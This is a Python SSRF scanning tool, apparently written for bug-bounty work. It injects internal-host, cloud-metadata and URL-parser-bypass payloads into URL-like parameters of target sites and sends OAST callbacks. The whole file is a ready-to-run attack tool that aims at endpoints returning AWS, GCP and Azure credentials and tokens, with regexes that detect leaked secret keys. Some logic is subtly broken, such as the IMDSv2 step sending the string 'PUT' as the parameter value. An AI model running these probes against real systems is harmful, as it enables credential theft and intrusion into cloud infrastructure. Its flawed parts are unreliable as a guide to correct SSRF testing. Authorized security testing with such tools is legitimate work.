#!/usr/bin/env python3
"""SSRF Probe — identifies URL-like parameters and tests SSRF via internal hosts, metadata, OAST, and parser bypasses.

Usage:
    python3 ssrf_probe.py --urls urls.txt --context .bb/context.json
    python3 ssrf_probe.py --urls urls.txt --context .bb/context.json --dry-run
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone


INTERNAL_TARGETS = [
    ("127.0.0.1", ["127.0.0.1:80", "127.0.0.1:443", "127.0.0.1:8080", "127.0.0.1:22", "127.0.0.1:6379"]),
    ("localhost", ["localhost:80", "localhost:443", "localhost:8080"]),
    ("internal_ips", ["10.0.0.1:80", "172.16.0.1:80", "192.168.0.1:80", "[::1]:80"]),
]

CLOUD_METADATA = [
    ("aws_imdsv1", "http://169.254.169.254/latest/meta-data/"),
    ("aws_imdsv1_creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws_imdsv1_userdata", "http://169.254.169.254/latest/user-data/"),
    ("aws_imdsv2_hop1", "http://169.254.169.254/latest/api/token"),
    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("gcp_alt", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"),
    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("do_metadata", "http://169.254.169.254/metadata/v1.json"),
    ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/"),
    ("oracle_metadata", "http://169.254.169.254/opc/v2/instance/"),
    ("openstack_metadata", "http://169.254.169.254/openstack/latest/meta_data.json"),
]

URL_PARSER_BYPASSES = [
    ("at_sign", "http://target@127.0.0.1/"),
    ("at_sign_encoded", "http://target:@127.0.0.1/"),
    ("hash_fragment", "http://127.0.0.1#@example.com/"),
    ("hash_fragment2", "http://example.com#@127.0.0.1/"),
    ("localhost_subdomain", "http://localhost.example.com/"),
    ("localhost_subdomain_nested", "http://127.0.0.1.example.com/"),
    ("double_at", "http://trusted@evil@127.0.0.1/"),
    ("backslash", "http://example.com\\@127.0.0.1/"),
    ("semicolon", "http://127.0.0.1:80/;@example.com/"),
    ("url_encoding_at", "http://trusted%40evil@127.0.0.1/"),
    ("url_encoding_slash", "http://example.com%2F@127.0.0.1/"),
    ("unicode_to_ascii", "http://127.0.0.1@127.0.0.1/"),
    ("nipio", "http://127.0.0.1.nip.io/"),
    ("localtest_me", "http://localtest.me/"),
    ("dns_rebinding", "http://7f000001.127.0.0.1.xip.io/"),
]

METADATA_SIGNATURES = {
    "aws": [r'"AccessKeyId"', r'"SecretAccessKey"', r'"Token"', r'ami-id', r'instance-id', r'security-credentials'],
    "gcp": [r'"access_token"', r'"expires_in"', r'"token_type"'],
    "azure": [r'compute/', r'network/', r'azEnvironment'],
    "digitalocean": [r'"droplet_id"', r'"hostname"', r'"region"'],
    "alibaba": [r'instance-id', r'image-id', r'mac'],
    "oracle": [r'"displayName"', r'"compartmentId"', r'"availabilityDomain"'],
    "openstack": [r'"uuid"', r'"public_keys"', r'"meta"'],
}

URL_PARAM_PATTERNS = [
    re.compile(r'[?&](url|uri|link|href|src|source|dest|destination|redirect|return|callback|next|forward|proxy|fetch|load|target)=', re.I),
    re.compile(r'[?&](path|file|page|resource|asset|object|content|data|input|remote|external|outbound|webhook)=', re.I),
    re.compile(r'[?&](image_url|img_url|avatar|thumbnail|icon|logo|video|audio|download|attachment|document)=', re.I),
    re.compile(r'[?&](endpoint|host|domain|server|gateway|upstream|backend|origin|referer|referrer)=', re.I),
]


def load_context(ctx_path):
    if not ctx_path or not os.path.exists(ctx_path):
        return {}
    try:
        with open(ctx_path) as f:
            return json.load(f)
    except Exception:
        return {}


def load_urls(urls_file):
    if not urls_file or not os.path.exists(urls_file):
        return []
    with open(urls_file) as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]


def extract_url_params(url):
    results = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    for key, values in qs.items():
        for pattern in URL_PARAM_PATTERNS:
            if pattern.search(f"{key}="):
                for val in values:
                    if val.startswith(("http://", "https://")):
                        results.append((url, key, val))
                    else:
                        results.append((url, key, val))
                break
    return results


def make_request_with_payload(base_url, param_name, payload_value, timeout=15, extra_headers=None):
    if callable(base_url):
        test_url = base_url
    else:
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param_name] = [payload_value]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; SSRFProbe/2.0)",
        "Accept": "*/*",
    }
    if extra_headers:
        headers.update(extra_headers)

    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        import http.client
        import urllib.request

        req = urllib.request.Request(test_url, headers=headers)
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read()
        return {
            "status": resp.status,
            "body": body.decode("utf-8", errors="replace"),
            "body_len": len(body),
            "url": test_url,
            "headers": dict(resp.headers),
        }
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return {
            "status": e.code,
            "body": body.decode("utf-8", errors="replace") if body else "",
            "body_len": len(body) if body else 0,
            "url": test_url,
            "headers": dict(e.headers) if hasattr(e, 'headers') else {},
        }
    except urllib.error.URLError as e:
        return {"status": 0, "body": "", "body_len": 0, "url": test_url, "error": str(e.reason), "headers": {}}
    except Exception as e:
        return {"status": 0, "body": "", "body_len": 0, "url": test_url, "error": str(e), "headers": {}}


def detect_metadata(body):
    findings = []
    for provider, sigs in METADATA_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                findings.append(provider)
                break
    return findings


def build_oast_payload(oast_domain):
    if not oast_domain:
        return None
    uid = f"ssrf-{int(time.time())}"
    return f"http://{uid}.{oast_domain}/"


def test_internal(url, param, timeout, context):
    findings = []
    for category, targets in INTERNAL_TARGETS:
        for target in targets:
            payload = f"http://{target}/"
            sys.stderr.write(f"  [internal] testing {url} param={param} with {payload}\n")
            result = make_request_with_payload(url, param, payload, timeout=timeout)
            result["category"] = "internal"
            result["target_type"] = category
            result["payload"] = payload
            result["timestamp"] = datetime.now(timezone.utc).isoformat()
            if result.get("status") in (200, 301, 302) or (result.get("status", 0) == 0 and "refused" not in result.get("error", "")):
                result["finding"] = "SSRF_TO_INTERNAL_HOST"
                result["severity"] = "high"
                findings.append(result)
            elif result.get("status", 0) != 0:
                result["finding"] = "no_ssrf"
                result["severity"] = "info"
            else:
                result["finding"] = "connection_error"
                result["severity"] = "info"
            sys.stderr.write(f"  [internal] -> status={result.get('status',0)} body_len={result.get('body_len',0)}\n")
            time.sleep(0.2)
    return findings


def test_metadata(url, param, timeout, context):
    findings = []
    for name, payload in CLOUD_METADATA:
        sys.stderr.write(f"  [metadata] testing {url} param={param} with {name}\n")
        extra_headers = {}
        if "gcp" in name or "metadata.google.internal" in payload:
            extra_headers["Metadata-Flavor"] = "Google"
        if "imdsv2" in name:
            extra_headers["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"
            result = make_request_with_payload(url, param, "PUT", timeout=timeout, extra_headers=extra_headers)
            if result.get("status") == 200 and result.get("body_len", 0) > 0:
                token = result.get("body", "").strip()
                extra_headers["X-aws-ec2-metadata-token"] = token
                payload = "http://169.254.169.254/latest/meta-data/"
        result = make_request_with_payload(url, param, payload, timeout=timeout, extra_headers=extra_headers)
        result["category"] = "cloud_metadata"
        result["provider"] = name.split("_")[0]
        result["payload"] = payload
        result["timestamp"] = datetime.now(timezone.utc).isoformat()
        md_detected = detect_metadata(result.get("body", ""))
        if result.get("status") == 200 and (result.get("body_len", 0) > 50 or md_detected):
            result["finding"] = "SSRF_CLOUD_METADATA"
            result["severity"] = "critical"
            result["detected_providers"] = md_detected
        elif result.get("status") == 200:
            result["finding"] = "SSRF_POSSIBLE"
            result["severity"] = "medium"
        else:
            result["finding"] = "no_ssrf"
            result["severity"] = "info"
        findings.append(result)
        sys.stderr.write(f"  [metadata] {name} -> status={result.get('status',0)} body_len={result.get('body_len',0)} md={md_detected}\n")
        time.sleep(0.3)
    return findings


def test_oast(url, param, timeout, context):
    oast_domain = context.get("OAST_DOMAIN", "") or context.get("interactsh_url", "")
    if not oast_domain:
        sys.stderr.write("  [oast] no OAST domain configured, skipping\n")
        return []
    findings = []
    payload = build_oast_payload(oast_domain)
    if payload:
        sys.stderr.write(f"  [oast] testing {url} param={param} with OAST callback\n")
        result = make_request_with_payload(url, param, payload, timeout=timeout)
        result["category"] = "oast"
        result["payload"] = payload
        result["timestamp"] = datetime.now(timezone.utc).isoformat()
        if result.get("status", 0) != 0:
            result["finding"] = "SSRF_OAST_SENT"
            result["severity"] = "high"
            result["note"] = "Check OAST server for callback"
        else:
            result["finding"] = "no_ssrf"
            result["severity"] = "info"
        findings.append(result)
    return findings


def test_url_parser_bypasses(url, param, timeout, context):
    findings = []
    expected_host = urllib.parse.urlparse(url).hostname or ""
    for name, payload in URL_PARSER_BYPASSES:
        sys.stderr.write(f"  [bypass] testing {url} param={param} with {name}: {payload}\n")
        # Build the test URL with the bypass payload
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        import http.client
        import ssl
        import urllib.request
        import urllib.error

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0 (compatible; SSRFProbe/2.0)"})
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            body = resp.read()
            result = {
                "status": resp.status,
                "body": body.decode("utf-8", errors="replace"),
                "body_len": len(body),
                "url": test_url,
                "headers": dict(resp.headers),
                "category": "url_parser_bypass",
                "bypass_name": name,
                "payload": payload,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        except urllib.error.HTTPError as e:
            body = b""
            try:
                body = e.read()
            except Exception:
                pass
            result = {
                "status": e.code,
                "body": body.decode("utf-8", errors="replace") if body else "",
                "body_len": len(body) if body else 0,
                "url": test_url,
                "headers": dict(e.headers) if hasattr(e, 'headers') else {},
                "category": "url_parser_bypass",
                "bypass_name": name,
                "payload": payload,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        except Exception as e:
            result = {
                "status": 0,
                "body": "",
                "body_len": 0,
                "url": test_url,
                "error": str(e),
                "category": "url_parser_bypass",
                "bypass_name": name,
                "payload": payload,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

        response_body = result.get("body", "")
        md_detected = detect_metadata(response_body)
        # Determine if this bypass reached an internal resource
        if result.get("status") == 200 and (result.get("body_len", 0) > 100 or md_detected):
            result["finding"] = "SSRF_BYPASS_WORKED"
            result["severity"] = "high"
        elif result.get("status") == 200 and result.get("body_len", 0) > 0:
            result["finding"] = "SSRF_BYPASS_PARTIAL"
            result["severity"] = "medium"
        else:
            result["finding"] = "bypass_blocked"
            result["severity"] = "info"
        findings.append(result)
        sys.stderr.write(f"  [bypass] {name} -> status={result.get('status',0)} body_len={result.get('body_len',0)}\n")
        time.sleep(0.2)
    return findings


def main():
    ap = argparse.ArgumentParser(description="SSRF Probe — identify and test URL-like parameters for SSRF vulnerabilities")
    ap.add_argument("--urls", required=True, help="File containing URLs to probe (one per line)")
    ap.add_argument("--context", default=None, help="Path to .bb/context.json for session configuration")
    ap.add_argument("--output", default=None, help="Output JSONL file (default: findings.jsonl)")
    ap.add_argument("--dry-run", action="store_true", help="Preview which params would be tested without making requests")
    ap.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    ap.add_argument("--no-internal", action="store_true", help="Skip internal host testing")
    ap.add_argument("--no-metadata", action="store_true", help="Skip cloud metadata testing")
    ap.add_argument("--no-oast", action="store_true", help="Skip OAST callback testing")
    ap.add_argument("--no-bypass", action="store_true", help="Skip URL parser bypass testing")
    args = ap.parse_args()

    context = load_context(args.context)
    outdir = context.get("OUTDIR", os.getcwd())
    output_file = args.output or os.path.join(outdir, "findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        sys.stderr.write(f"[ERROR] No URLs loaded from {args.urls}\n")
        sys.exit(1)

    sys.stderr.write(f"[*] Loaded {len(urls)} URLs from {args.urls}\n")

    all_param_urls = []
    for url in urls:
        params = extract_url_params(url)
        all_param_urls.extend(params)

    if not all_param_urls:
        sys.stderr.write("[!] No URL-like parameters found in provided URLs\n")
        sys.exit(0)

    sys.stderr.write(f"[*] Found {len(all_param_urls)} URL-like parameter instances\n")
    for url, param, val in all_param_urls[:20]:
        sys.stderr.write(f"    {param}={val[:50]}...  (from {url[:80]})\n")
    if len(all_param_urls) > 20:
        sys.stderr.write(f"    ... and {len(all_param_urls) - 20} more\n")

    if args.dry_run:
        sys.stderr.write("\n[DRY RUN] Would test the following parameter instances:\n")
        for url, param, val in all_param_urls:
            sys.stderr.write(f"  URL: {url}\n  PARAM: {param}\n  VALUE: {val}\n  ---\n")
        sys.stdout.write(json.dumps({"status": "dry_run", "params_found": len(all_param_urls)}))
        return

    all_findings = []

    for url, param, val in all_param_urls:
        sys.stderr.write(f"\n{'='*60}\n")
        sys.stderr.write(f"Probing: {url[:100]}  param={param}\n")
        sys.stderr.write(f"{'='*60}\n")

        if not args.no_internal:
            all_findings.extend(test_internal(url, param, args.timeout, context))
        if not args.no_metadata:
            all_findings.extend(test_metadata(url, param, args.timeout, context))
        if not args.no_oast:
            all_findings.extend(test_oast(url, param, args.timeout, context))
        if not args.no_bypass:
            all_findings.extend(test_url_parser_bypasses(url, param, args.timeout, context))

    os.makedirs(os.path.dirname(output_file) or ".", exist_ok=True)
    with open(output_file, "w") as f:
        for finding in all_findings:
            f.write(json.dumps(finding) + "\n")

    critical = [f for f in all_findings if f.get("severity") == "critical"]
    high = [f for f in all_findings if f.get("severity") == "high"]
    medium = [f for f in all_findings if f.get("severity") == "medium"]

    summary = {
        "total_probes": len(all_findings),
        "critical": len(critical),
        "high": len(high),
        "medium": len(medium),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    sys.stderr.write(f"\n[DONE] {len(all_findings)} probes: {len(critical)} critical, {len(high)} high, {len(medium)} medium\n")
    sys.stderr.write(f"[OUTPUT] -> {output_file}\n")

    sys.stdout.write(json.dumps(summary) + "\n")

    high_severity = [f for f in all_findings if f.get("severity") in ("critical", "high")]
    for f in high_severity:
        sys.stderr.write(f"  [!] {f.get('finding','')} | {f.get('category','')} | {f.get('payload','')[:80]}\n")


if __name__ == "__main__":
    main()